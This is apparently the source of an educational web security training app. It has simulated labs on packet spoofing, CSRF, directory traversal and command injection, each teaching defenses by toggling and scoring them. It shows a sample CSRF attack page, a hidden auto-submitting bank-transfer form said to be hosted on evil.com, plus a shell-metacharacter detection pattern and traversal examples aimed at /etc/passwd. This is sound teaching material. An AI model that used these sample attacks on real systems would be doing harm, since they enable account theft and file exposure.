// ─── PACKET SPOOFING LAB ──────────────────────────────────────────────────────
const PacketLab = ({ addLog, addScore, onBack }) => {
  const [running, setRunning]   = useState(false);
  const [pkts, setPkts]         = useState([]);
  const [def, setDef]           = useState({ filter:false, inspect:false });
  const [stats, setStats]       = useState({ sent:0, spoofed:0, blocked:0 });
  const [labState, setLabState] = useState("idle");
  // Snapshot of defenses at start — used for both scoring AND the blocking logic
  // so toggling mid-sim cannot change the outcome.
  const defAtStart = useRef({ filter:false, inspect:false });
  const genRef=useRef(null), animRef=useRef(null), pktId=useRef(0);
  const statsRef = useRef({ sent:0, spoofed:0, blocked:0 });
  const scoredRef = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [lastPts, setLastPts]           = useState(0);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);

  const stop = () => {
    clearInterval(genRef.current); cancelAnimationFrame(animRef.current); setRunning(false);
    const { sent, spoofed, blocked } = statsRef.current;
    const defs = [defAtStart.current.filter&&"Packet Filtering", defAtStart.current.inspect&&"Deep Packet Inspection"].filter(Boolean);
    const success = blocked > 0 && defs.length > 0;
    const fail    = spoofed > 0 && blocked === 0;
    const noData  = spoofed === 0;
    if (success) {
      setLabState("success");
      const key = defs.join("|");
      if (!scoredRef.current.has(key)) {
        const pts = Math.min(blocked * 5, 100);
        addScore("packet", pts); scoredRef.current.add(key);
        setJustScored(true); setLastPts(pts);
      }
    } else if (fail) {
      setLabState("fail");
    } else if (noData) {
      setLabState("neutral"); // stopped too early — no spoofed packets appeared yet
    }
    addLog(mkEvent("packet","Admin","Network","info",`Sim stopped — ${sent} pkts, ${blocked}/${spoofed} spoofed blocked`));
  };

  useEffect(() => {
    if (!running) return;
    genRef.current = setInterval(() => {
      const spoof = Math.random() < 0.35;
      const pkt = { id:pktId.current++, src:spoof?`10.x.x.${~~(Math.random()*255)+1}`:`192.168.1.${~~(Math.random()*254)+1}`, dst:"10.0.0.1", spoof, blocked:false, x:0, age:0 };
      statsRef.current.sent++;
      if (spoof) statsRef.current.spoofed++;
      setPkts(p=>[...p.slice(-30), pkt]);
      addLog(mkEvent("packet","Network","Router",spoof?"medium":"info", spoof?`Spoofed: ${pkt.src}->${pkt.dst}`:`Legit: ${pkt.src}->${pkt.dst}`));
    }, 900);
    const syncT = setInterval(() => setStats({...statsRef.current}), 250);
    return () => { clearInterval(genRef.current); clearInterval(syncT); };
  }, [running]);

  useEffect(() => {
    if (!running) return;
    const loop = () => {
      setPkts(prev => {
        const next = [];
        for (const p of prev) {
          if (p.blocked) { if ((p.age??0) < 18) next.push({...p, age:(p.age??0)+1}); continue; }
          if (p.x >= 100) continue;
          const nx = p.x + 2.5;
          // Use defAtStart snapshot — not live def — so mid-sim toggle can't cheat
          if (nx >= 50 && p.spoof && (defAtStart.current.filter || defAtStart.current.inspect)) {
            statsRef.current.blocked++;
            next.push({...p, x:50, blocked:true, age:0});
          } else {
            next.push({...p, x:nx});
          }
        }
        return next;
      });
      animRef.current = requestAnimationFrame(loop);
    };
    animRef.current = requestAnimationFrame(loop);
    return () => cancelAnimationFrame(animRef.current);
  }, [running]);

  useEffect(() => () => { clearInterval(genRef.current); cancelAnimationFrame(animRef.current); }, []);

  const startSim = () => {
    setPkts([]); setStats({sent:0,spoofed:0,blocked:0}); statsRef.current={sent:0,spoofed:0,blocked:0};
    defAtStart.current = { filter:def.filter, inspect:def.inspect };
    setRunning(true); setLabState("idle"); setJustScored(false);
    addLog(mkEvent("packet","Admin","Network","info","Simulation started"));
  };
  const reset = () => {
    clearInterval(genRef.current); cancelAnimationFrame(animRef.current); setRunning(false);
    setPkts([]); setStats({sent:0,spoofed:0,blocked:0}); statsRef.current={sent:0,spoofed:0,blocked:0};
    setLabState("idle"); setJustScored(false);
  };

  const packetReveal = (
    <p>Enable <strong className="text-slate-200">Packet Filtering</strong> to validate source IPs against expected address ranges — packets claiming to originate from outside those ranges are dropped. Add <strong className="text-slate-200">Deep Packet Inspection</strong> to analyze header fields for structural inconsistencies that indicate forgery. Both active together provides the widest coverage.</p>
  );

  const successContent = (
    <div>
      <p>Spoofed packets were intercepted. {defAtStart.current.filter && defAtStart.current.inspect ? "Both Packet Filtering and Deep Packet Inspection worked in tandem — filtering caught packets with unexpected source ranges; DPI caught structurally inconsistent headers that slipped through." : defAtStart.current.filter ? "Packet Filtering validated each source IP against the allowed range and dropped packets with addresses outside it." : "Deep Packet Inspection detected header field inconsistencies that are characteristic of spoofed packets."}</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Packet Spoofing Visualizer" subtitle="Enable network defenses before starting to block spoofed traffic"
        statusOk={!running} statusLabel={running?"Simulation Active":"Ready"} onBack={onBack}/>

      <ChallengeBox accent="purple" title="Challenge"
        showSolution={showSolution} onToggle={() => setShowSolution(v=>!v)} solutionContent={packetReveal}>
        Your network is receiving a mix of legitimate and spoofed packets. Configure defenses <em>before</em> starting — they are locked in once the simulation begins. Run it for a few seconds, then click <strong>Stop</strong> to see your result.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        {/* ── Left: defenses + stats ── */}
        <div className="space-y-3">
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            {running && (
              <div className="flex items-center gap-1.5 text-xs text-amber-500 mb-3 bg-amber-900/10 border border-amber-500/20 rounded-lg px-3 py-2">
                <AlertTriangle size={11}/> Defenses locked — stop the simulation to reconfigure
              </div>
            )}
            <div className="space-y-3">
              <Toggle enabled={def.filter}  disabled={running} onChange={v=>setDef(d=>({...d,filter:v}))}  label="Packet Filtering"       desc="Drop packets with source IPs outside expected ranges"/>
              <Toggle enabled={def.inspect} disabled={running} onChange={v=>setDef(d=>({...d,inspect:v}))} label="Deep Packet Inspection"  desc="Analyze header fields for forgery inconsistencies"/>
            </div>
            <div className="flex gap-2 mt-4">
              <button onClick={startSim} disabled={running}
                className={`flex-1 flex items-center justify-center gap-2 text-sm font-semibold py-2 rounded-lg transition-colors ${running?"opacity-40 cursor-not-allowed bg-cyan-800":"bg-cyan-700 hover:bg-cyan-600"} text-white`}>
                <Play size={13}/> Start
              </button>
              <button onClick={stop} disabled={!running}
                className={`flex-1 flex items-center justify-center gap-2 text-sm font-semibold py-2 rounded-lg transition-colors ${!running?"opacity-40 cursor-not-allowed bg-red-900":"bg-red-700 hover:bg-red-600"} text-white`}>
                <Square size={13}/> Stop
              </button>
            </div>
            {labState !== "idle" && !running && (
              <button onClick={reset}
                className="mt-2 w-full flex items-center justify-center gap-2 text-xs bg-slate-800 hover:bg-slate-700 border border-slate-700 text-slate-400 py-1.5 rounded-lg">
                <RotateCcw size={11}/> Reset
              </button>
            )}
            {labState === "neutral" && !running && (
              <div className="mt-2 flex items-center gap-1.5 text-xs text-amber-500 bg-amber-900/10 border border-amber-500/20 rounded-lg px-3 py-2">
                <Info size={11}/> No spoofed packets appeared — run a few more seconds before stopping.
              </div>
            )}
          </Card>

          <Card>
            <SectionHead>Network Stats</SectionHead>
            {[
              ["Total Packets",stats.sent,"text-white"],
              ["Spoofed Detected",stats.spoofed,"text-amber-400"],
              ["Packets Blocked",stats.blocked,"text-green-400"],
              ["Spoofed Passed",Math.max(0,stats.spoofed-stats.blocked),"text-red-400"],
            ].map(([k,v,vc])=>(
              <div key={k} className="flex justify-between text-sm mb-1.5">
                <span className="text-slate-500">{k}</span>
                <span className={`font-mono ${vc}`}>{v}</span>
              </div>
            ))}
            {stats.spoofed > 0 && (
              <div className="mt-2">
                <div className="flex justify-between text-xs text-slate-600 mb-1">
                  <span>Block rate</span>
                  <span>{Math.round(stats.blocked/stats.spoofed*100)}%</span>
                </div>
                <div className="w-full bg-slate-800 rounded-full h-1.5">
                  <div className="bg-green-500 h-1.5 rounded-full transition-all"
                    style={{width:`${Math.round(stats.blocked/stats.spoofed*100)}%`}}/>
                </div>
              </div>
            )}
          </Card>
        </div>

        {/* ── Right: visualization + log ── */}
        <div className="space-y-3">
          <Card>
            <SectionHead>Network Visualization</SectionHead>
            <div className="relative h-52 bg-slate-950 rounded-xl border border-slate-800 overflow-hidden">
              {[
                { label:"Internet\n(Attacker)", pos:"left-2 top-1/2 -translate-y-1/2", col:"border-slate-700" },
                { label:defAtStart.current.filter||defAtStart.current.inspect?"🛡 Filter ON":"Filter OFF",
                  pos:"left-1/2 top-1/2 -translate-x-1/2 -translate-y-1/2",
                  col:defAtStart.current.filter||defAtStart.current.inspect?"border-green-500/60 text-green-400 bg-green-900/20":"border-slate-700 text-slate-600" },
                { label:"Server", pos:"right-2 top-1/2 -translate-y-1/2", col:"border-slate-700" },
              ].map((n,i)=>(
                <div key={i} className={`absolute flex flex-col items-center ${n.pos}`}>
                  <div className={`w-16 h-10 rounded-lg border text-[9px] flex items-center justify-center text-center px-1 bg-slate-900 ${n.col} leading-tight`}>
                    {n.label}
                  </div>
                </div>
              ))}
              {pkts.map(p=>{
                const xPct=7+(p.x/100)*84, yPct=50+((p.id%7)-3)*7;
                const opacity=p.blocked?Math.max(0,1-(p.age??0)/18):1;
                return (
                  <div key={p.id} title={`${p.spoof?"SPOOFED":"LEGIT"} ${p.src}`}
                    className={`absolute w-2.5 h-2.5 rounded-full pointer-events-none ${p.blocked?"bg-red-500":p.spoof?"bg-amber-400":"bg-green-400"}`}
                    style={{left:`${xPct}%`,top:`${yPct}%`,transform:"translate(-50%,-50%)",opacity,transition:"none"}}/>
                );
              })}
              <div className="absolute bottom-2 right-2 space-y-0.5">
                {[["bg-green-400","Legitimate"],["bg-amber-400","Spoofed"],["bg-red-500","Blocked"]].map(([c,l])=>(
                  <div key={l} className="flex items-center gap-1.5">
                    <div className={`w-2 h-2 rounded-full ${c}`}/>
                    <span className="text-[10px] text-slate-600">{l}</span>
                  </div>
                ))}
              </div>
            </div>
          </Card>

          <Card>
            <SectionHead>Packet Log</SectionHead>
            <div className="max-h-28 overflow-y-auto space-y-0.5 font-mono text-xs">
              {pkts.length === 0 && <div className="text-slate-700 italic">Start simulation to see traffic…</div>}
              {[...pkts].reverse().slice(0,12).map(p=>(
                <div key={p.id} className="flex items-center gap-2">
                  <span className={p.spoof?"text-amber-500":"text-green-500"}>{p.spoof?"⚠":"+"}</span>
                  <span className="text-slate-500 truncate">{p.src}</span>
                  <span className="text-slate-700">→</span>
                  <span className="text-slate-400">{p.dst}</span>
                  {p.blocked && <span className="ml-auto text-red-400 flex-shrink-0">BLOCKED</span>}
                  {!p.blocked && p.spoof && <span className="ml-auto text-amber-400 flex-shrink-0">PASSED</span>}
                </div>
              ))}
            </div>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable both <strong className="text-slate-200">Packet Filtering</strong> and <strong className="text-slate-200">Deep Packet Inspection</strong> <em>before</em> clicking Start — defenses are snapshotted at launch and cannot be changed mid-simulation. Run it for a few seconds, then click Stop. The block-rate bar should show spoofed packets being caught.</p>}
        failMsg="Spoofed packets reached the server undetected. Configure defenses before starting the simulation and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};


// ─── CSRF LAB ─────────────────────────────────────────────────────────────────
const CSRFLab = ({ addLog, addScore, onBack }) => {
  const [def, setDef]           = useState({ csrfToken:false, sameSite:false, originCheck:false });
  const [labState, setLabState] = useState("idle");
  const [balance, setBalance]   = useState(5000);
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setBalance(5000); setResult(null); setJustScored(false); };

  const simulate = () => {
    const blocked = def.csrfToken || def.sameSite || def.originCheck;
    const reason  = def.csrfToken   ? 'CSRF token missing from request — server rejected'
                  : def.sameSite    ? 'SameSite=Strict: browser blocked the cookie on a cross-origin POST'
                  : def.originCheck ? 'Origin "evil.com" does not match "securebank.example.com"'
                  : "";
    setResult({ blocked, reason });
    if (blocked) {
      setLabState("success");
      addLog(mkEvent("csrf","Attacker","SecureBank","info",`CSRF blocked — ${reason}`));
      const key = [def.csrfToken,def.sameSite,def.originCheck].join("|");
      if (!scoredRef.current.has(key)) { addScore("csrf",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      setBalance(b => b - 2500);
      setLabState("fail");
      addLog(mkEvent("csrf","Attacker","SecureBank","critical","CSRF transfer executed — $2,500 stolen"));
    }
  };

  const csrfReveal = (
    <p>Enable any one defense: a <strong className="text-slate-200">CSRF Token</strong> (a one-time secret embedded in the real page that the attacker's cross-origin page can never read), <strong className="text-slate-200">SameSite=Strict</strong> (the browser won't attach the session cookie to cross-origin requests), or <strong className="text-slate-200">Origin Header Validation</strong> (reject requests whose Origin doesn't match your domain). In production, use CSRF tokens and SameSite together.</p>
  );

  const successContent = (
    <div>
      <p>{result?.reason || "The forged request was rejected."}{" "}
        {def.csrfToken && " The CSRF token is a secret embedded in the legitimate form. Because the attacker's page is cross-origin, the Same-Origin Policy prevents it from reading the token — so the forged form can't include it."}
        {def.sameSite  && " SameSite=Strict means the browser won't attach the session cookie to any request that didn't originate from your own site."}
        {def.originCheck && " Origin validation lets the server verify that requests came from its own domain before processing them."}
      </p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="CSRF Attack Simulator" subtitle="Stop a malicious page from making authenticated requests on the victim's behalf" onBack={onBack}/>

      <ChallengeBox accent="teal" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={csrfReveal}>
        You're logged into SecureBank. An attacker has emailed you a "prize" link. When you visit it, a hidden form silently submits a bank transfer using your active session cookie. Configure server or browser defenses, then click <strong>Simulate Visit</strong>.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <p className="text-xs text-slate-600 mb-3 leading-relaxed">Without any defense the bank server has no way to tell your real transfer form from the attacker's hidden form — both arrive with the same valid session cookie.</p>
            <div className="space-y-3">
              <Toggle enabled={def.csrfToken}   onChange={v=>{setDef(d=>({...d,csrfToken:v})); reset();}}   label="CSRF Token"             desc="Embed a one-time secret in every form; server rejects requests missing it"/>
              <Toggle enabled={def.sameSite}    onChange={v=>{setDef(d=>({...d,sameSite:v})); reset();}}    label="SameSite=Strict Cookie"  desc="Browser won't attach session cookie to cross-origin form submissions"/>
              <Toggle enabled={def.originCheck} onChange={v=>{setDef(d=>({...d,originCheck:v})); reset();}} label="Origin Header Validation" desc="Server rejects requests whose Origin doesn't match the site's domain"/>
            </div>
            <button onClick={simulate}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Simulate Visit
            </button>
          </Card>
          <Card>
            <SectionHead>How CSRF Works</SectionHead>
            <p className="text-[11px] text-slate-500 leading-relaxed">Browsers automatically attach cookies to every request destined for a domain — including requests triggered by a <em>different</em> site. CSRF exploits this by hosting a form on evil.com that targets securebank.com. The bank receives a perfectly valid session cookie and has no built-in way to reject the request.</p>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>SecureBank — Your Account</SectionHead>
            <div className="bg-slate-950 rounded-xl border border-slate-800 overflow-hidden">
              <div className="bg-blue-900/20 border-b border-slate-800 px-4 py-2 flex items-center gap-2">
                <div className="w-2 h-2 rounded-full bg-green-500 animate-pulse"/>
                <span className="text-[11px] text-slate-400 font-mono">securebank.example.com — session: jane_a4f9</span>
              </div>
              <div className="p-4">
                <div className="flex justify-between items-center mb-3">
                  <span className="text-xs text-slate-500">Checking Account — Jane Doe</span>
                  <span className={`text-2xl font-mono font-bold transition-colors ${balance < 5000 ? "text-red-400" : "text-green-400"}`}>${balance.toLocaleString()}</span>
                </div>
                {labState === "fail" && (
                  <div className="bg-red-900/30 border border-red-500/40 rounded-lg p-3 text-xs space-y-0.5">
                    <div className="text-red-400 font-semibold">⚠ Unauthorised Transfer Executed</div>
                    <div className="text-slate-400">$2,500 → attacker_wallet_xyz</div>
                    <div className="text-slate-600">Your session cookie was used without your knowledge</div>
                  </div>
                )}
                {labState === "success" && (
                  <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs">
                    <div className="text-green-400 font-semibold">✓ Transfer Request Rejected</div>
                    <div className="text-slate-400 mt-0.5">{result?.reason}</div>
                  </div>
                )}
                {labState === "idle" && <div className="text-xs text-slate-700 text-center py-3">Click "Simulate Visit" to run the attack</div>}
              </div>
            </div>
          </Card>

          <Card>
            <SectionHead>Attacker's Malicious Page (source)</SectionHead>
            <div className="bg-slate-950 rounded-lg border border-slate-800 overflow-hidden">
              <div className="bg-slate-800 px-3 py-1 text-[10px] font-mono text-red-400">http://evil.com/prize-claim.html</div>
              <pre className="p-3 text-[10px] font-mono text-slate-500 leading-relaxed overflow-x-auto">{`<form action="https://securebank.example.com/transfer"
      method="POST" id="x" style="display:none">
  <input name="amount" value="2500"/>
  <input name="to"     value="attacker_wallet_xyz"/>
${def.csrfToken ? '  <input name="_csrf" value="???"/>  <!-- attacker cannot\n                                        read your CSRF token -->' : '  <!-- no token required without CSRF defense -->'}
</form>
<script>document.getElementById("x").submit();</script>`}</pre>
            </div>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">CSRF Token</strong> and click <strong>Simulate Visit</strong>. The attacker's hidden form (visible in the page source on the right) has no way to read your site's token — so it can't include one — and the bank rejects the request, leaving your $5,000 balance untouched.</p>}
        failMsg="The forged transfer executed — $2,500 moved without consent. The bank accepted the request because it had a valid session cookie. Enable a defense and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── DIRECTORY TRAVERSAL LAB ──────────────────────────────────────────────────
const TraversalLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("tr1");
  const [filename, setFilename] = useState(TRAVERSAL_PAYLOADS[0].val);
  const [def, setDef]           = useState({ canonicalize:false, allowlist:false, chroot:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  const BASE = "/var/www/uploads/";
  const isTraversal = /\.\.[\\/]|\.\.$/.test(filename);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const resolvedPath = (raw) => {
    const full = BASE + raw;
    const parts = full.split("/").filter(Boolean);
    const stack = [];
    for (const p of parts) { if (p === "..") stack.pop(); else if (p !== ".") stack.push(p); }
    return "/" + stack.join("/");
  };

  const download = () => {
    if (!isTraversal) { setResult({ safe:true }); setLabState("neutral"); return; }
    const path = resolvedPath(filename);
    const blocked = def.canonicalize || def.allowlist || def.chroot;
    if (blocked) {
      const reason = def.chroot       ? "Chroot jail: process root is /var/www/ — OS won't resolve paths beyond it"
                   : def.allowlist    ? "Allowlist rejected: filename contains disallowed characters (.. / \\)"
                   : `Canonicalized path "${path}" is outside base directory "${BASE}" — access denied`;
      setResult({ blocked:true, path, reason });
      setLabState("success");
      addLog(mkEvent("traversal","Attacker","File Server","info","Path traversal blocked"));
      const key = [def.canonicalize,def.allowlist,def.chroot,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("traversal",25); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      const contents = FAKE_FILE_CONTENTS[filename] || "(file not found)";
      setResult({ blocked:false, path, contents });
      setLabState("fail");
      addLog(mkEvent("traversal","Attacker","File Server","critical",`File exposed: ${path}`));
    }
  };

  const pick = (id) => { setSelId(id); const p=TRAVERSAL_PAYLOADS.find(x=>x.id===id); if(p)setFilename(p.val); reset(); };

  const travReveal = (
    <p>Enable <strong className="text-slate-200">Path Canonicalization</strong>: resolve the real absolute path (stripping all <code className="text-slate-400">../</code> sequences), then confirm it starts with <code className="text-slate-400">/var/www/uploads/</code> before reading. An <strong className="text-slate-200">Allowlist</strong> (only permit alphanumeric filenames + safe extensions) is a quick second layer. A <strong className="text-slate-200">Chroot/Sandbox</strong> makes traversal impossible at the OS level.</p>
  );

  const successContent = (
    <div>
      <p>{result?.reason || "The traversal was blocked."}{" "}Path traversal relies on the server naively joining user input onto a base path. Canonicalization resolves all <code className="text-slate-400">../</code> hops into the final absolute path first, then checks it falls within the allowed directory — there is nothing left to escape.</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Directory Traversal" subtitle="Prevent path sequences from escaping the web root to expose system files" statusOk label="Synthetic FS" onBack={onBack}/>

      <ChallengeBox accent="green" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={travReveal}>
        A file-download endpoint serves files from <code className="text-slate-300 bg-slate-800 px-1 rounded">/var/www/uploads/</code>. The filename comes directly from a URL parameter. Choose a traversal payload, configure path validation, then click <strong>Download File</strong>.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>File Request</SectionHead>
            <select className="w-full bg-slate-800 border border-slate-700 text-slate-300 text-sm rounded-lg px-3 py-2 mb-3"
              value={selId} onChange={e=>pick(e.target.value)}>
              {TRAVERSAL_PAYLOADS.map(p=><option key={p.id} value={p.id}>{p.label} — {p.sev}</option>)}
            </select>
            <label className="text-xs text-slate-600 block mb-1">?file= parameter</label>
            <input className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-sm rounded-lg px-3 py-2"
              value={filename} onChange={e=>{setFilename(e.target.value); reset();}}/>
            {isTraversal && <div className="mt-2 flex items-center gap-1.5 text-xs text-red-400"><AlertTriangle size={12}/> Traversal sequence detected</div>}
            <div className="mt-3 bg-slate-950 border border-slate-700 rounded-lg p-2">
              <div className="text-[10px] text-slate-600 mb-1">Resolved server path:</div>
              <div className="font-mono text-[11px] text-amber-300 break-all">{resolvedPath(filename)}</div>
            </div>
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.canonicalize} onChange={v=>{setDef(d=>({...d,canonicalize:v})); reset();}} label="Path Canonicalization" desc="Resolve real path, reject anything outside /var/www/uploads/"/>
              <Toggle enabled={def.allowlist}    onChange={v=>{setDef(d=>({...d,allowlist:v})); reset();}}    label="Allowlist Validation"  desc="Only permit [a-zA-Z0-9._-] — blocks ../ entirely"/>
              <Toggle enabled={def.chroot}       onChange={v=>{setDef(d=>({...d,chroot:v})); reset();}}       label="Chroot / Sandbox"      desc="OS-level jail — process cannot see files outside its root"/>
            </div>
            <button onClick={download}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Download size={14}/> Download File
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Server Response</SectionHead>
            {labState === "idle" && <div className="text-center text-slate-700 text-xs py-10">Submit a request to see the response</div>}
            {labState === "neutral" && (
              <div className="space-y-2">
                <div className="text-xs text-blue-400 font-semibold">200 OK — file served normally</div>
                <div className="text-xs text-slate-500">{FAKE_FILE_CONTENTS[filename]}</div>
              </div>
            )}
            {labState === "success" && result && (
              <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-3 text-xs">
                <div className="text-green-400 font-semibold mb-1">403 Forbidden</div>
                <div className="text-slate-400">{result.reason}</div>
              </div>
            )}
            {labState === "fail" && result && (
              <div className="space-y-2">
                <div className="flex items-center gap-1.5 text-xs text-red-400 font-semibold"><AlertTriangle size={11}/> 200 OK — sensitive file exposed</div>
                <div className="text-[10px] text-slate-500 font-mono">{result.path}</div>
                <div className="bg-slate-950 border border-slate-700 rounded-lg p-3">
                  <div className="text-[10px] text-red-400 font-semibold mb-1.5">FILE CONTENTS</div>
                  <pre className="font-mono text-[11px] text-red-300 whitespace-pre-wrap leading-relaxed">{result.contents}</pre>
                </div>
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Why It Works</SectionHead>
            <p className="text-[11px] text-slate-500 leading-relaxed">The server builds a path: <code className="text-slate-400">BASE + userInput</code>. Each <code className="text-slate-400">../</code> moves one level up. Given enough of them, the path escapes <code className="text-slate-400">/var/www/uploads/</code> entirely and can reach any file accessible to the web process — including <code className="text-slate-400">/etc/passwd</code>, SSH keys, or application secrets.</p>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState} successContent={successContent}
        revealContent={<p>Enable <strong className="text-slate-200">Path Canonicalization</strong> and click <strong>Download File</strong>. Watch the "Resolved server path" preview — all the <code className="text-slate-400">../</code> sequences collapse away, and since the resulting path no longer starts with <code className="text-slate-400">/var/www/uploads/</code> the server returns 403 Forbidden instead of the file.</p>}
        failMsg="The server returned a sensitive file from outside the web root. Enable a defense and try again."
        neutralMsg="Safe filename — no traversal sequences detected. This file is served normally from the uploads directory."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── COMMAND INJECTION LAB ────────────────────────────────────────────────────
const CmdInjectLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("c1");
  const [input, setInput]       = useState(CMD_PAYLOADS[0].val);
  const [def, setDef]           = useState({ parameterized:false, sanitize:false, allowlist:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  const SHELL_RE = /[;&|`$(){}[\]<>\\'"\n]/;
  const isInjection = SHELL_RE.test(input);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const builtCmd = () => {
    if (def.parameterized) return `execvp("ping", ["-c","4","${input.split(/[;&|]/).shift()?.trim()||""}"])`;
    if (def.sanitize)      return `ping -c 4 ${input.replace(SHELL_RE,"").trim()}`;
    if (def.allowlist)     return /^[a-zA-Z0-9.\-]+$/.test(input.split(/[;&|]/).shift()?.trim()||"") ? `ping -c 4 ${input}` : `ping -c 4 [REJECTED — invalid chars]`;
    return `ping -c 4 ${input}`;
  };

  const run = () => {
    const cmdSnapshot = builtCmd(); // snapshot before any state changes
    if (!isInjection) { setResult({ output: `PING ${input} 56 bytes\n64 bytes: icmp_seq=1 ttl=118 time=15ms\n64 bytes: icmp_seq=2 ttl=118 time=14ms` }); setLabState("neutral"); return; }
    const blocked = def.parameterized || def.sanitize || def.allowlist;
    if (blocked) {
      const reason = def.parameterized ? "execvp() called with an argument array — shell never invoked, metacharacters are literal"
                   : def.sanitize      ? "Metacharacters stripped before execution — injected payload removed"
                   : "Allowlist check failed: only [a-z0-9.-] permitted in host/IP fields";
      setResult({ blocked:true, reason, cmd:cmdSnapshot });
      setLabState("success");
      addLog(mkEvent("cmdinject","Attacker","Server","info","Command injection blocked"));
      const key = [def.parameterized,def.sanitize,def.allowlist,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("cmdinject",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      const output = FAKE_CMD_OUTPUT[input] || `Executed: ${input}\n[output redacted]`;
      setResult({ blocked:false, cmd:cmdSnapshot, output });
      setLabState("fail");
      addLog(mkEvent("cmdinject","Attacker","Server","critical",`Command injection executed: ${input.slice(0,50)}`));
    }
  };

  const pick = (id) => { setSelId(id); const p=CMD_PAYLOADS.find(x=>x.id===id); if(p)setInput(p.val); reset(); };

  const cmdReveal = (
    <p><strong className="text-slate-200">Parameterized Execution</strong> is the definitive fix: call <code className="text-slate-400">execvp("ping", ["-c","4", userInput])</code> directly — no shell is ever spawned, so <code className="text-slate-400">;</code> and <code className="text-slate-400">|</code> are just characters in a string. Input Sanitization and Allowlisting are good supplementary layers but can be bypassed with unusual encoding. Avoid shell: altogether when possible.</p>
  );

  const successContent = (
    <div>
      <p>{result?.reason || "The injection was blocked."}{" "}Command injection is the OS-level equivalent of SQL injection — both exploit string concatenation into an interpreted context. The fix is the same concept: never build a command or query by concatenating untrusted input into a string that will be interpreted.</p>
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Command Injection" subtitle="Prevent OS commands from being injected through a web input field" statusOk label="Sandbox" onBack={onBack}/>

      <ChallengeBox accent="rose" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={cmdReveal}>
        A "Network Diagnostics" page runs <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">ping &lt;user_input&gt;</code> in a shell. An attacker appends shell metacharacters after a valid IP. Configure defenses and click <strong>Run Diagnostic</strong>.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Attacker Input</SectionHead>
            <select className="w-full bg-slate-800 border border-slate-700 text-slate-300 text-sm rounded-lg px-3 py-2 mb-3"
              value={selId} onChange={e=>pick(e.target.value)}>
              {CMD_PAYLOADS.map(p=><option key={p.id} value={p.id}>{p.label} — {p.sev}</option>)}
            </select>
            <label className="text-xs text-slate-600 block mb-1">Target host / IP</label>
            <input className="w-full bg-slate-800 border border-slate-700 text-green-400 font-mono text-sm rounded-lg px-3 py-2"
              value={input} onChange={e=>{setInput(e.target.value); reset();}}/>
            {isInjection && <div className="mt-2 flex items-center gap-1.5 text-xs text-red-400"><AlertTriangle size={12}/> Shell metacharacters detected</div>}
